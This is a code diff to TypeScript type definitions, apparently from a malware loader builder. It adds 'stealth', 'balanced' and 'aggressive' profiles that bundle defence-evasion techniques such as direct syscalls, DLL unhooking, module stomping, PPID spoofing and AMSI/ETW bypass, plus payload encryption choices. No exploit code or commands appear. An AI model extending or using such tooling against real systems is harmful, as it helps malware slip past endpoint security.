@@ -5,6 +5,7 @@ export type LoaderType =
   | 'Wsf' | 'Hta' | 'Regsvr32Sct' | 'MsBuild' | 'Cmstp' | 'WmicXsl'
   | 'DocxMacro' | 'XlsxMacro' | 'InstallUtil'
 export type Encryption  = 'Aes256' | 'Chacha20'
+export type Profile = 'stealth' | 'balanced' | 'aggressive'
 
 export interface LoaderTypeMeta {
   type:  LoaderType
@@ -45,6 +46,18 @@ export const ALL_FEATURES = [
   'Staged',        'AppDomain',     'ThreadlessInject',
 ] as const
 export type Feature = typeof ALL_FEATURES[number]
+
+export const PROFILE_FEATURES: Record<Profile, Feature[]> = {
+  stealth:    ['DirectSyscall', 'UnhookKnownDlls', 'ModuleStomp', 'PpidSpoof', 'SleepEncrypt', 'StackSpoof', 'AmsiHwbp', 'EtwHwbp'],
+  balanced:   ['DirectSyscall', 'SleepEncrypt', 'AmsiHwbp', 'EtwHwbp'],
+  aggressive: ['AmsiHwbp'],
+}
+
+export const PROFILE_ENCRYPTION: Record<Profile, Encryption> = {
+  stealth:    'Aes256',
+  balanced:   'Chacha20',
+  aggressive: 'Aes256',
+}
 
 export interface PeMetadataReq {
   company_name: string; file_description: string; product_name: string
